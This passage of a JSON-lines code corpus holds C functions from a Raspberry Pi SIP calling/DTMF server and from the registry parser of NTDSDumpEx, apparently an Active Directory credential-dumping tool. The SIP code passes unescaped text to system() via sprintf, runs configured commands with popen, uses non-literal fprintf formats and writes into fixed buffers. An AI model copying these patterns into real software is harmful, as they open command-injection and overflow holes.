status);\n\t\n\tlog_message(\"Done.\\n\");\n}", "path": "tools\\c\\sip-tools\\sipserv.c", "repo_name": "binerry/RaspberryPi", "stars": 147, "license": "None", "language": "c", "size": 246}
{"docstring": "// helper for creating call-recorder\n", "func_signal": "static void create_recorder(pjsua_call_info ci)", "code": "{\n\t// specify target file\n\tpj_str_t rec_file = pj_str(rec_ans_file);\n\tpj_status_t status = PJ_ENOTFOUND;\n\t\n\tlog_message(\"Creating recorder ... \");\n\t\n\t// Create recorder for call\n\tstatus = pjsua_recorder_create(&rec_file, 0, NULL, 0, 0, &rec_id);\n\tif (status != PJ_SUCCESS) error_exit(\"Error recording answer\", status);\n\t\n\t// connect active call to call recorder\n\tpjsua_conf_port_id rec_port = pjsua_recorder_get_conf_port(rec_id);\t\t\n\tpjsua_conf_connect(ci.conf_slot, rec_port);\n\t\n\tlog_message(\"Done.\\n\");\n}", "path": "tools\\c\\sip-tools\\sipserv.c", "repo_name": "binerry/RaspberryPi", "stars": 147, "license": "None", "language": "c", "size": 246}
{"docstring": "// helper for parsing command-line-argument\n", "func_signal": "static int try_get_argument(int arg, char *arg_id, char **arg_val, int argc, char *argv[])", "code": "{\n\tint found = 0;\n\t\n\t// check if actual argument is searched argument\n\tif (!strcasecmp(argv[arg], arg_id)) \n\t{\n\t\t// check if actual argument has a value\n\t\tif (argc >= (arg+1))\n\t\t{\n\t\t\t// set value\n\t\t\t*arg_val = argv[arg+1];\t\t\t\n\t\t\tfound = 1;\n\t\t}\n\t}\t\n\treturn found;\n}", "path": "tools\\c\\sip-tools\\sipcall.c", "repo_name": "binerry/RaspberryPi", "stars": 147, "license": "None", "language": "c", "size": 246}
{"docstring": "// helper for making calls over sip-account\n", "func_signal": "static void make_sip_call()", "code": "{\n\tpj_status_t status;\n\t\n\tlog_message(\"Starting call ... \");\n\t\n\t// build target sip-url\n\tchar sip_target_url[40];\n\tsprintf(sip_target_url, \"sip:%s@%s\", app_cfg.phone_number, app_cfg.sip_domain);\n\t\n\t// start call with sip-url\n\tpj_str_t uri = pj_str(sip_target_url);\n\tstatus = pjsua_call_make_call(acc_id, &uri, 0, NULL, NULL, NULL);\n\tif (status != PJ_SUCCESS) error_exit(\"Error making call\", status);\n\t\n\tlog_message(\"Done.\\n\");\n}", "path": "tools\\c\\sip-tools\\sipcall.c", "repo_name": "binerry/RaspberryPi", "stars": 147, "license": "None", "language": "c", "size": 246}
{"docstring": "// handler for incoming-call-events\n", "func_signal": "static void on_incoming_call(pjsua_acc_id acc_id, pjsua_call_id call_id, pjsip_rx_data *rdata)", "code": "{\n\t// get call infos\n\tpjsua_call_info ci;\n\tpjsua_call_get_info(call_id, &ci);\n\n\tPJ_UNUSED_ARG(acc_id);\n\tPJ_UNUSED_ARG(rdata);\n\t\n\tcurrent_call = call_id;\n\n\t// log call info\n\tchar info[100];\n\tsprintf(info, \"Incoming call from %s\\n\", ci.remote_info.ptr);\n\tlog_message(info);\n\n\t// automatically answer incoming call with 200 status/OK \n\tpjsua_call_answer(call_id, 200, NULL, NULL);\n}", "path": "tools\\c\\sip-tools\\sipserv.c", "repo_name": "binerry/RaspberryPi", "stars": 147, "license": "None", "language": "c", "size": 246}
{"docstring": "// helper for displaying usage infos\n", "func_signal": "static void usage(int error)", "code": "{\n\tif (error == 1)\n\t{\n\t\tputs(\"Error, to few arguments.\");\n\t\tputs  (\"\");\n\t}\n    puts  (\"Usage:\");\n    puts  (\"  sipcall [options]\");\n    puts  (\"\");\n    puts  (\"Mandatory options:\");\n    puts  (\"  -sd=string    Set sip provider domain.\");\n\tputs  (\"  -su=string    Set sip username.\");\n\tputs  (\"  -sp=string    Set sip password.\");\n\tputs  (\"  -pn=string    Set target phone number to call\");\n\tputs  (\"  -tts=string   Text to speak\");\n    puts  (\"\");\n\tputs  (\"Optional options:\");\n\tputs  (\"  -ttsf=string  TTS speech file name to save text\");\n\tputs  (\"  -rcf=string   Record call file name to save answer\");\n\tputs  (\"  -mr=int       Repeat message x-times\");\n\tputs  (\"  -s=int        Silent mode (hide info messages) (0/1)\");\n\tputs  (\"\");\n\t\n\tfflush(stdout);\n}", "path": "tools\\c\\sip-tools\\sipcall.c", "repo_name": "binerry/RaspberryPi", "stars": 147, "license": "None", "language": "c", "size": 246}
{"docstring": "// helper for logging messages to console (disabled if silent mode is active)\n", "func_signal": "static void log_message(char *message)", "code": "{\n\tif (!app_cfg.silent_mode)\n\t{\n\t\tfprintf(stderr, message);\n\t}\n}", "path": "tools\\c\\sip-tools\\sipcall.c", "repo_name": "binerry/RaspberryPi", "stars": 147, "license": "None", "language": "c", "size": 246}
{"docstring": "// handler for dtmf-events\n", "func_signal": "static void on_dtmf_digit(pjsua_call_id call_id, int digit)", "code": "{\n\t// get call infos\n\tpjsua_call_info ci; \n\tpjsua_call_get_info(call_id, &ci);\n\t\n\t// work on detected dtmf digit\n\tint dtmf_key = digit - 48;\n\t\n\tchar info[100];\n\tsprintf(info, \"DTMF command detected: %i\\n\", dtmf_key);\n\tlog_message(info);\n\t\n\tstruct dtmf_config *d_cfg = &app_cfg.dtmf_cfg[dtmf_key-1];\n\tif (d_cfg->processing_active == 0)\n\t{\n\t\td_cfg->processing_active = 1;\n\t\t\n\t\tif (d_cfg->active == 1)\n\t\t{\n\t\t\tlog_message(\"Active DTMF command found for received digit.\\n\");\n\t\t\tlog_message(\"Creating answer ... \");\n\t\t\t\n\t\t\tint error = 0;\n\t\t\tFILE *fp;\n\t\t\t\n\t\t\tfp = popen(d_cfg->cmd, \"r\");\n\t\t\tif (fp == NULL) {\n\t\t\t\terror = 1;\n\t\t\t\tlog_message(\" (Failed to run command) \");\n\t\t\t}\n\t\t\t\n\t\t\tchar result[20];\n\t\t\tif (!error)\n\t\t\t{\n\t\t\t\tif (fgets(result, sizeof(result)-1, fp) == NULL)\n\t\t\t\t{\n\t\t\t\t\terror = 1;\n\t\t\t\t\tlog_message(\" (Failed to read result) \");\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\tif (!error)\n\t\t\t{  \n\t\t\t\tif (play_id != -1) pjsua_player_destroy(play_id);\n\t\t\t\t\n\t\t\t\tchar tts_buffer[200];\n\t\t\t\tsprintf(tts_buffer, d_cfg->tts_answer, result);\n\t\t\t\t\n\t\t\t\tint synth_status = -1;\n\t\t\t\tsynth_status = synthesize_speech(tts_buffer, tts_answer_file);\t\n\t\t\t\tif (synth_status != 0) log_message(\" (Failed to synthesize speech) \");\t\n\t\t\t\t\n\t\t\t\tcreate_player(call_id, tts_answer_file);\n\t\t\t}\n\t\t\t\n\t\t\tlog_message(\"Done.\\n\");\n\t\t}\n\t\telse\n\t\t{\n\t\t\tlog_message(\"No active DTMF command found for received digit.\\n\");\n\t\t}\n\t\t\n\t\td_cfg->processing_active = 0;\n\t}\n\telse\n\t{\n\t\tlog_message(\"DTMF command dropped - state is actual processing.\\n\");\n\t}\n}", "path": "tools\\c\\sip-tools\\sipserv.c", "repo_name": "binerry/RaspberryPi", "stars": 147, "license": "None", "language": "c", "size": 246}
{"docstring": "// synthesize speech / create message via espeak\n", "func_signal": "static void synthesize_speech(char *file)", "code": "{\n\tlog_message(\"Synthesizing speech ... \");\n\t\n\tint speech_status = -1;\n\tchar speech_command[200];\n\tsprintf(speech_command, \"espeak -v%s -a%i -k%i -s%i -p%i -w %s '%s'\", ESPEAK_LANGUAGE, ESPEAK_AMPLITUDE, ESPEAK_CAPITALS_PITCH, ESPEAK_SPEED, ESPEAK_PITCH, file, app_cfg.tts);\n\tspeech_status = system(speech_command);\n\tif (speech_status != 0) error_exit(\"Error while creating phone text\", speech_status);\n\t\n\tlog_message(\"Done.\\n\");\n}", "path": "tools\\c\\sip-tools\\sipcall.c", "repo_name": "binerry/RaspberryPi", "stars": 147, "license": "None", "language": "c", "size": 246}
{"docstring": "// helper for creating call-media-player\n", "func_signal": "static void create_player(pjsua_call_id call_id)", "code": "{\n\t// get call infos\n\tpjsua_call_info ci; \n\tpjsua_call_get_info(call_id, &ci);\n\t\n\tpj_str_t name;\n\tpj_status_t status = PJ_ENOTFOUND;\n\t\n\tlog_message(\"Creating player ... \");\n\t\n\t// create player for playback media\t\t\n\tstatus = pjsua_player_create(pj_cstr(&name, app_cfg.tts_file), 0, &play_id);\n\tif (status != PJ_SUCCESS) error_exit(\"Error playing sound-playback\", status);\n\t\t\n\t// connect active call to media player\n\tpjsua_conf_connect(pjsua_player_get_conf_port(play_id), ci.conf_slot);\n\t\n\t// get media port (play_port) from play_id\n    status = pjsua_player_get_port(play_id, &play_port);\n\tif (status != PJ_SUCCESS) error_exit(\"Error getting sound player port\", status);\n\t\n\t// register media finished callback\t\n    status = pjmedia_wav_player_set_eof_cb(play_port, NULL, &on_media_finished);\n\tif (status != PJ_SUCCESS) error_exit(\"Error adding sound-playback callback\", status);\n\t\n\tlog_message(\"Done.\\n\");\n}", "path": "tools\\c\\sip-tools\\sipcall.c", "repo_name": "binerry/RaspberryPi", "stars": 147, "license": "None", "language": "c", "size": 246}
{"docstring": "// helper for creating call-media-player\n", "func_signal": "static void create_player(pjsua_call_id call_id, char *file)", "code": "{\n\t// get call infos\n\tpjsua_call_info ci; \n\tpjsua_call_get_info(call_id, &ci);\n\t\n\tpj_str_t name;\n\tpj_status_t status = PJ_ENOTFOUND;\n\t\n\tlog_message(\"Creating player ... \");\n\t\n\t// create player for playback media\t\t\n\tstatus = pjsua_player_create(pj_cstr(&name, file), PJMEDIA_FILE_NO_LOOP, &play_id);\n\tif (status != PJ_SUCCESS) error_exit(\"Error playing sound-playback\", status);\n\t\t\n\t// connect active call to media player\n\tpjsua_conf_connect(pjsua_player_get_conf_port(play_id), ci.conf_slot);\n\t\n\t// get media port (play_port) from play_id\n    status = pjsua_player_get_port(play_id, &play_port);\n\tif (status != PJ_SUCCESS) error_exit(\"Error getting sound player port\", status);\t\n\t\n\tlog_message(\"Done.\\n\");\n}", "path": "tools\\c\\sip-tools\\sipserv.c", "repo_name": "binerry/RaspberryPi", "stars": 147, "license": "None", "language": "c", "size": 246}
{"docstring": "// handler for call-media-state-change-events\n", "func_signal": "static void on_call_media_state(pjsua_call_id call_id)", "code": "{\n\t// get call infos\n\tpjsua_call_info ci; \n\tpjsua_call_get_info(call_id, &ci);\n\t\n\tpj_status_t status = PJ_ENOTFOUND;\n\n\t// check state if call is established/active\n\tif (ci.media_status == PJSUA_CALL_MEDIA_ACTIVE) {\n\t\n\t\tlog_message(\"Call media activated.\\n\");\t\n\t\t\n\t\t// create and start media player\n\t\tcreate_player(call_id, tts_file);\n\t\t\n\t\t// create and start call recorder\n\t\tif (app_cfg.record_calls)\n\t\t{\n\t\t\tcreate_recorder(ci);\n\t\t}\n\t} \n}", "path": "tools\\c\\sip-tools\\sipserv.c", "repo_name": "binerry/RaspberryPi", "stars": 147, "license": "None", "language": "c", "size": 246}
{"docstring": "// synthesize speech / create message via espeak\n", "func_signal": "static int synthesize_speech(char *speech, char *file)", "code": "{\n\tint speech_status = -1;\n\t\n\tchar speech_command[1024];\n\tsprintf(speech_command, \"espeak -v%s -a%i -k%i -s%i -p%i -w %s '%s'\", ESPEAK_LANGUAGE, ESPEAK_AMPLITUDE, ESPEAK_CAPITALS_PITCH, ESPEAK_SPEED, ESPEAK_PITCH, file, speech);\n\tspeech_status = system(speech_command);\n\t\n\treturn speech_status;\n}", "path": "tools\\c\\sip-tools\\sipserv.c", "repo_name": "binerry/RaspberryPi", "stars": 147, "license": "None", "language": "c", "size": 246}
{"docstring": "// helper for displaying usage infos\n", "func_signal": "static void usage(int error)", "code": "{\n\tif (error == 1)\n\t{\n\t\tputs(\"Error, to few arguments.\");\n\t\tputs  (\"\");\n\t}\n    puts  (\"Usage:\");\n    puts  (\"  sipserv [options]\");\n    puts  (\"\");\n\tputs  (\"Commandline:\");\n    puts  (\"Mandatory options:\");\n    puts  (\"  --config-file=string   Set config file\");\n    puts  (\"\");\n\tputs  (\"Optional options:\");\n\tputs  (\"  -s=int       Silent mode (hide info messages) (0/1)\");\n\tputs  (\"\");\n\tputs  (\"\");\n\tputs  (\"Config file:\");\n\tputs  (\"Mandatory options:\");\n\tputs  (\"  sd=string   Set sip provider domain.\");\n\tputs  (\"  su=string   Set sip username.\");\n\tputs  (\"  sp=string   Set sip password.\");\n\tputs  (\"\");\n\tputs  (\" and at least one dtmf configuration (X = dtmf-key index):\");\n\tputs  (\"  dtmf.X.active=int           Set dtmf-setting active (0/1).\");\n\tputs  (\"  dtmf.X.description=string   Set description.\");\n\tputs  (\"  dtmf.X.tts-intro=string     Set tts intro.\");\n\tputs  (\"  dtmf.X.tts-answer=string    Set tts answer.\");\n\tputs  (\"  dtmf.X.cmd=string           Set dtmf command.\");\n\tputs  (\"\");\n\tputs  (\"Optional options:\");\n\tputs  (\"  rc=int      Record call (0/1)\");\n\tputs  (\"\");\n\t\n\tfflush(stdout);\n}", "path": "tools\\c\\sip-tools\\sipserv.c", "repo_name": "binerry/RaspberryPi", "stars": 147, "license": "None", "language": "c", "size": 246}
{"docstring": "// handler for call-state-change-events\n", "func_signal": "static void on_call_state(pjsua_call_id call_id, pjsip_event *e)", "code": "{\n\t// get call infos\n\tpjsua_call_info ci;\n\tpjsua_call_get_info(call_id, &ci);\n\t\n\t// prevent warning about unused argument e\n    PJ_UNUSED_ARG(e);\n\t\n\t// check call state\n\tif (ci.state == PJSIP_INV_STATE_CONFIRMED) \n\t{\n\t\tlog_message(\"Call confirmed.\\n\");\n\t\t\n\t\tcall_confirmed = 1;\n\t\t\n\t\t// ensure that message is played from start\n\t\tif (play_id != PJSUA_INVALID_ID)\n\t\t{\n\t\t\tpjmedia_wav_player_port_set_pos(play_port, 0);\n\t\t}\n\t}\n\tif (ci.state == PJSIP_INV_STATE_DISCONNECTED) \n\t{\n\t\tlog_message(\"Call disconnected.\\n\");\n\t\t\n\t\t// exit app if call is finished/disconnected\n\t\tapp_exit();\n\t}\n}", "path": "tools\\c\\sip-tools\\sipcall.c", "repo_name": "binerry/RaspberryPi", "stars": 147, "license": "None", "language": "c", "size": 246}
{"docstring": "// handler for call-media-state-change-events\n", "func_signal": "static void on_call_media_state(pjsua_call_id call_id)", "code": "{\n\t// get call infos\n\tpjsua_call_info ci; \n\tpjsua_call_get_info(call_id, &ci);\n\t\n\tpj_status_t status = PJ_ENOTFOUND;\n\n\t// check state if call is established/active\n\tif (ci.media_status == PJSUA_CALL_MEDIA_ACTIVE) {\n\t\n\t\tlog_message(\"Call media activated.\\n\");\n\t\t\n\t\t// create and start media player\n\t\tcreate_player(call_id);\n\t\t\n\t\t// create and start call recorder\n\t\tif (app_cfg.record_call)\n\t\t{\n\t\t\tcreate_recorder(ci);\n\t\t}\n\t} \n}", "path": "tools\\c\\sip-tools\\sipcall.c", "repo_name": "binerry/RaspberryPi", "stars": 147, "license": "None", "language": "c", "size": 246}
{"docstring": "// helper for creating and registering sip-account\n", "func_signal": "static void register_sip(void)", "code": "{\n\tpj_status_t status;\n\t\n\tlog_message(\"Registering account ... \");\n\t\n\t// prepare account configuration\n\tpjsua_acc_config cfg;\n\tpjsua_acc_config_default(&cfg);\n\t\n\t// build sip-user-url\n\tchar sip_user_url[40];\n\tsprintf(sip_user_url, \"sip:%s@%s\", app_cfg.sip_user, app_cfg.sip_domain);\n\t\n\t// build sip-provder-url\n\tchar sip_provider_url[40];\n\tsprintf(sip_provider_url, \"sip:%s\", app_cfg.sip_domain);\n\t\n\t// create and define account\n\tcfg.id = pj_str(sip_user_url);\n\tcfg.reg_uri = pj_str(sip_provider_url);\n\tcfg.cred_count = 1;\n\tcfg.cred_info[0].realm = pj_str(app_cfg.sip_domain);\n\tcfg.cred_info[0].scheme = pj_str(\"digest\");\n\tcfg.cred_info[0].username = pj_str(app_cfg.sip_user);\n\tcfg.cred_info[0].data_type = PJSIP_CRED_DATA_PLAIN_PASSWD;\n\tcfg.cred_info[0].data = pj_str(app_cfg.sip_password);\n\t\n\t// add account\n\tstatus = pjsua_acc_add(&cfg, PJ_TRUE, &acc_id);\n\tif (status != PJ_SUCCESS) error_exit(\"Error adding account\", status);\n\t\n\tlog_message(\"Done.\\n\");\n}", "path": "tools\\c\\sip-tools\\sipcall.c", "repo_name": "binerry/RaspberryPi", "stars": 147, "license": "None", "language": "c", "size": 246}
{"docstring": "// helper for parsing command-line-argument\n", "func_signal": "static int try_get_argument(int arg, char *arg_id, char **arg_val, int argc, char *argv[])", "code": "{\n\tint found = 0;\n\t\n\t// check if actual argument is searched argument\n\tif (!strcasecmp(argv[arg], arg_id)) \n\t{\n\t\t// check if actual argument has a value\n\t\tif (argc >= (arg+1))\n\t\t{\n\t\t\t// set value\n\t\t\t*arg_val = argv[arg+1];\t\t\t\n\t\t\tfound = 1;\n\t\t}\n\t}\t\n\treturn found;\n}", "path": "tools\\c\\sip-tools\\sipserv.c", "repo_name": "binerry/RaspberryPi", "stars": 147, "license": "None", "language": "c", "size": 246}
{"docstring": "/* Utility routines */\n", "func_signal": "char *str_dup( const char *str )", "code": "{\n    char *str_new;\n\n    if (!str)\n        return 0 ;\n\n    CREATE( str_new, char, strlen(str) + 1 );\n    strcpy( str_new, str );\n    return str_new;\n}", "path": "NTDSDumpEx\\ntreg.c", "repo_name": "zcgonvh/NTDSDumpEx", "stars": 193, "license": "gpl-2.0", "language": "c", "size": 159}
{"docstring": "/* Quick and dirty UNICODE to std. ascii */\n", "func_signal": "void cheap_uni2ascii(char *src, char *dest, int l)", "code": "{\n   \n   for (; l > 0; l -=2) {\n      *dest = *src;\n      dest++; src +=2;\n   }\n   *dest = 0;\n}", "path": "NTDSDumpEx\\ntreg.c", "repo_name": "zcgonvh/NTDSDumpEx", "stars": 193, "license": "gpl-2.0", "language": "c", "size": 159}
{"docstring": "/* Parse the ri subindex-datablock\n * (Used to list li/lf/lh's when ~>500keys)\n * vofs = offset into struct (after size linkage)\n */\n", "func_signal": "void parse_ri(struct hive *hdesc, int vofs, int blen)", "code": "{\n  struct ri_key *key;\n  int i;\n\n}", "path": "NTDSDumpEx\\ntreg.c", "repo_name": "zcgonvh/NTDSDumpEx", "stars": 193, "license": "gpl-2.0", "language": "c", "size": 159}
{"docstring": "/* Get the type of a value */\n", "func_signal": "int get_val_type(struct hive *hdesc, int vofs, char *path, int exact)", "code": "{\n  struct vk_key *vkkey;\n  int vkofs;\n\n  vkofs = trav_path(hdesc, vofs,path,exact | TPF_VK);\n  if (!vkofs) {\n    return -1;\n  }\n  vkofs +=4;\n  vkkey = (struct vk_key *)(hdesc->buffer + vkofs);\n#if 0\n  if (vkkey->len_data & 0x80000000) return(REG_DWORD); /* Special case of INLINE storage */\n#endif\n  return(vkkey->val_type);\n}", "path": "NTDSDumpEx\\ntreg.c", "repo_name": "zcgonvh/NTDSDumpEx", "stars": 193, "license": "gpl-2.0", "language": "c", "size": 159}
{"docstring": "/* Get INTEGER from memory. This is probably low-endian specific? */\n", "func_signal": "int get_int( char *array )", "code": "{\n\treturn ((array[0]&0xff) + ((array[1]<<8)&0xff00) +\n\t\t   ((array[2]<<16)&0xff0000) +\n\t\t   ((array[3]<<24)&0xff000000));\n}", "path": "NTDSDumpEx\\ntreg.c", "repo_name": "zcgonvh/NTDSDumpEx", "stars": 193, "license": "gpl-2.0", "language": "c", "size": 159}
{"docstring": "/* Print len number of hexbytes */\n", "func_signal": "void hexprnt(char *s, unsigned char *bytes, int len)", "code": "{\nint i;\n\n   printf(\"%s\",s);\n   for (i = 0; i < len; i++) {\n      printf(\"%02x \",bytes[i]);\n   }\n   printf(\"\\n\");\n}", "path": "NTDSDumpEx\\ntreg.c", "repo_name": "zcgonvh/NTDSDumpEx", "stars": 193, "license": "gpl-2.0", "language": "c", "size": 159}
{"docstring": "/* Parse the li datablock (3.x 'nk' offsets list)\n * vofs = offset into struct (after size linkage)\n */\n", "func_signal": "void parse_li(struct hive *hdesc, int vofs, int blen)", "code": "{\n  struct li_key *key;\n  int i;\n\n}", "path": "NTDSDumpEx\\ntreg.c", "repo_name": "zcgonvh/NTDSDumpEx", "stars": 193, "license": "gpl-2.0", "language": "c", "size": 159}
{"docstring": "/* And, yer basic DWORD write */\n", "func_signal": "int put_dword(struct hive *hdesc, int vofs, char *path, int exact, int dword)", "code": "{\n  struct keyval *kr;\n  int r;\n\n  ALLOC(kr,1,sizeof(int)+sizeof(int));\n  \n  kr->len = sizeof(int);\n  kr->data = dword;\n\n  r = put_buf2val(hdesc, kr, vofs, path, REG_DWORD, exact);\n\n  FREE(kr);\n\n  return(r);\n}", "path": "NTDSDumpEx\\ntreg.c", "repo_name": "zcgonvh/NTDSDumpEx", "stars": 193, "license": "gpl-2.0", "language": "c", "size": 159}
{"docstring": "/* Parse the lf datablock (>4.0 'nk' offsets lookuptable)\n * vofs = offset into struct (after size linkage)\n */\n", "func_signal": "void parse_lf(struct hive *hdesc, int vofs, int blen)", "code": "{\n  struct lf_key *key;\n  int i;\n\n}", "path": "NTDSDumpEx\\ntreg.c", "repo_name": "zcgonvh/NTDSDumpEx", "stars": 193, "license": "gpl-2.0", "language": "c", "size": 159}
{"docstring": "/* General search routine, find something in something else */\n", "func_signal": "int find_in_buf(char *buf, char *what, int sz, int len, int start)", "code": "{\n   int i;\n   \n   for (; start < sz; start++) {\n      for (i = 0; i < len; i++) {\n\tif (*(buf+start+i) != *(what+i)) break;\n      }\n      if (i == len) return(start);\n   }\n   return(0);\n}", "path": "NTDSDumpEx\\ntreg.c", "repo_name": "zcgonvh/NTDSDumpEx", "stars": 193, "license": "gpl-2.0", "language": "c", "size": 159}
{"docstring": "/* Parse the datablock\n * vofs = offset into struct (after size linkage)\n */\n", "func_signal": "int parse_block(struct hive *hdesc, int vofs,int verbose)", "code": "{\n  unsigned short id;\n  int seglen;\n\n  seglen = get_int(hdesc->buffer+vofs);  \n\n\n  \n  if (seglen < 0) {\n    seglen = -seglen;\n    hdesc->usetot += seglen;\n    hdesc->useblk++;\n  } else {\n    hdesc->unusetot += seglen;\n    hdesc->unuseblk++;\n#if ZEROFILLONLOAD\n    bzero(hdesc->buffer+vofs+4,seglen-4);\n#endif\n  }\n\n  vofs += 4;\n  id = (*(hdesc->buffer + vofs)<<8) + *(hdesc->buffer+vofs+1);\n\n  if (verbose) {\n    switch (id) {\n    case 0x6e6b: /* nk */\n      parse_nk(hdesc, vofs, seglen);\n      break;\n    case 0x766b: /* vk */\n      parse_vk(hdesc, vofs, seglen);\n      break;\n    case 0x6c66: /* lf */\n      parse_lf(hdesc, vofs, seglen);\n      break;\n    case 0x6c68: /* lh */\n      parse_lh(hdesc, vofs, seglen);\n      break;\n    case 0x6c69: /* li */\n      parse_li(hdesc, vofs, seglen);\n      break;\n    case 0x736b: /* sk */\n      parse_sk(hdesc, vofs, seglen);\n      break;\n    case 0x7269: /* ri */\n      parse_ri(hdesc, vofs, seglen);\n      break;\n    default:\n      break;\n    }\n  }\n  return(seglen);\n}", "path": "NTDSDumpEx\\ntreg.c", "repo_name": "zcgonvh/NTDSDumpEx", "stars": 193, "license": "gpl-2.0", "language": "c", "size": 159}
{"docstring": "/* Parse the vk datablock\n * vofs = offset into struct (after size linkage)\n */\n", "func_signal": "void parse_vk(struct hive *hdesc, int vofs, int blen)", "code": "{\n  struct vk_key *key;\n  int i;\n}", "path": "NTDSDumpEx\\ntreg.c", "repo_name": "zcgonvh/NTDSDumpEx", "stars": 193, "license": "gpl-2.0", "language": "c", "size": 159}
{"docstring": "/* Get len of a value, given current key + path */\n", "func_signal": "int get_val_len(struct hive *hdesc, int vofs, char *path, int exact)", "code": "{\n  struct vk_key *vkkey;\n  int vkofs;\n  int len;\n\n  vkofs = trav_path(hdesc, vofs,path,exact | TPF_VK);\n  if (!vkofs) {\n    return -1;\n  }\n  vkofs +=4;\n  vkkey = (struct vk_key *)(hdesc->buffer + vkofs);\n\n  len = vkkey->len_data & 0x7fffffff;\n\n  if ( vkkey->len_data == 0x80000000 ) {  /* Special inline case, return size of 4 (dword) */\n    len = 4;\n  }\n\n  return(len);\n}", "path": "NTDSDumpEx\\ntreg.c", "repo_name": "zcgonvh/NTDSDumpEx", "stars": 193, "license": "gpl-2.0", "language": "c", "size": 159}
{"docstring": "/* Write the hive back to disk (only if dirty & not readonly */\n", "func_signal": "int writeHive(struct hive *hdesc)", "code": "{\n  int len;\n\n  if (hdesc->state & HMODE_RO) return(0);\n  if ( !(hdesc->state & HMODE_DIRTY)) return(0);\n\n  if ( !(hdesc->state & HMODE_OPEN)) { /* File has been closed */\n    if (!(hdesc->filedesc = open(hdesc->filename,O_RDWR))) {\n      return(1);\n    }\n    hdesc->state |= HMODE_OPEN;\n  }  \n  /* Seek back to begginning of file (in case it's already open) */\n  lseek(hdesc->filedesc, 0, SEEK_SET);\n\n  len = write(hdesc->filedesc, hdesc->buffer, hdesc->size);\n  if (len != hdesc->size) {\n    return(1);\n  }\n\n  hdesc->state &= (~HMODE_DIRTY);\n  return(0);\n}", "path": "NTDSDumpEx\\ntreg.c", "repo_name": "zcgonvh/NTDSDumpEx", "stars": 193, "license": "gpl-2.0", "language": "c", "size": 159}
{"docstring": "/* Get a string of HEX bytes (space separated),\n * or if first char is ' get an ASCII string instead.\n */\n", "func_signal": "int gethexorstr(char **c, char *wb)", "code": "{\n   int l = 0;\n   \n   skipspace(c);\n   \n   if ( **c == '\\'') {\n      (*c)++;\n      while ( **c ) {\n\t *(wb++) = *((*c)++);\n\t l++;\n      }\n   } else {\n      do {\n\t *(wb++) = gethex(c);\n\t l++;\n\t skipspace(c);\n      } while ( **c );\n   }\n   return(l);\n}", "path": "NTDSDumpEx\\ntreg.c", "repo_name": "zcgonvh/NTDSDumpEx", "stars": 193, "license": "gpl-2.0", "language": "c", "size": 159}
{"docstring": "/* HexDump all or a part of some buffer */\n", "func_signal": "void hexdump(char *hbuf, int start, int stop, int ascii)", "code": "{\n   char c;\n   int diff,i;\n   \n   while (start < stop ) {\n      \n      diff = stop - start;\n      if (diff > 16) diff = 16;\n      \n      printf(\":%05X  \",start);\n\n      for (i = 0; i < diff; i++) {\n\t printf(\"%02X \",(unsigned char)*(hbuf+start+i));\n      }\n      if (ascii) {\n\tfor (i = diff; i < 16; i++) printf(\"   \");\n\tfor (i = 0; i < diff; i++) {\n\t  c = *(hbuf+start+i);\n\t  printf(\"%c\", isprint(c) ? c : '.');\n\t}\n      }\n      printf(\"\\n\");\n      start += 16;\n   }\n}", "path": "NTDSDumpEx\\ntreg.c", "repo_name": "zcgonvh/NTDSDumpEx", "stars": 193, "license": "gpl-2.0", "language": "c", "size": 159}
{"docstring": "/* DWORDs are so common that I make a small function to get it easily */\n", "func_signal": "int get_dword(struct hive *hdesc, int vofs, char *path, int exact)", "code": "{\n  struct keyval *v;\n  int dword;\n\n  v = get_val2buf(hdesc, NULL, vofs, path, REG_DWORD, exact | TPF_VK);\n  if (!v) return(-1); /* well... -1 COULD BE THE STORED VALUE TOO */\n\n  dword = (int)v->data;\n\n  FREE(v);\n\n  return(dword);\n  \n}", "path": "NTDSDumpEx\\ntreg.c", "repo_name": "zcgonvh/NTDSDumpEx", "stars": 193, "license": "gpl-2.0", "language": "c", "size": 159}
{"docstring": "/* Quick and dirty ascii to unicode */\n", "func_signal": "void cheap_ascii2uni(char *src, char *dest, int l)", "code": "{\n   for (; l > 0; l--) {\n      *dest++ = *src++;\n      *dest++ = 0;\n\n   }\n}", "path": "NTDSDumpEx\\ntreg.c", "repo_name": "zcgonvh/NTDSDumpEx", "stars": 193, "license": "gpl-2.0", "language": "c", "size": 159}
{"docstring": "/* Parse the lh datablock (WinXP offsets lookuptable)\n * vofs = offset into struct (after size linkage)\n * The hash is most likely a base 37 conversion of the name string\n */\n", "func_signal": "void parse_lh(struct hive *hdesc, int vofs, int blen)", "code": "{\n  struct lf_key *key;\n  int i;\n\n}", "path": "NTDSDumpEx\\ntreg.c", "repo_name": "zcgonvh/NTDSDumpEx", "stars": 193, "license": "gpl-2.0", "language": "c", "size": 159}
{"docstring": "/* Write to registry value.\n * If same size as existing, copy back in place to avoid changing too much\n * otherwise allocate new dataspace, then free the old\n * Thus enough space to hold both new and old data is needed\n * Pass inn buffer with data len as first DWORD (as routines above)\n * returns: 0 - error, len - OK (len of data)\n */\n", "func_signal": "int put_buf2val(struct hive *hdesc, struct keyval *kv,\n\t\tint vofs, char *path, int type, int exact )", "code": "{\n  int l;\n  void *keydataptr;\n\n  if (!kv) return(0);\n  l = get_val_len(hdesc, vofs, path, exact);\n  if (l == -1) return(0);  /* error */\n  if (kv->len != l) {  /* Realloc data block if not same size as existing */\n    if (!alloc_val_data(hdesc, vofs, path, kv->len, exact)) {\n      return(0);\n    }\n  }\n\n  keydataptr = get_val_data(hdesc, vofs, path, type, exact);\n  if (!keydataptr) return(0); /* error */\n\n  memcpy(keydataptr, &kv->data, kv->len);\n\n  hdesc->state |= HMODE_DIRTY;\n\n  return(kv->len);\n}", "path": "NTDSDumpEx\\ntreg.c", "repo_name": "zcgonvh/NTDSDumpEx", "stars": 193, "license": "gpl-2.0", "language": "c", "size": 159}
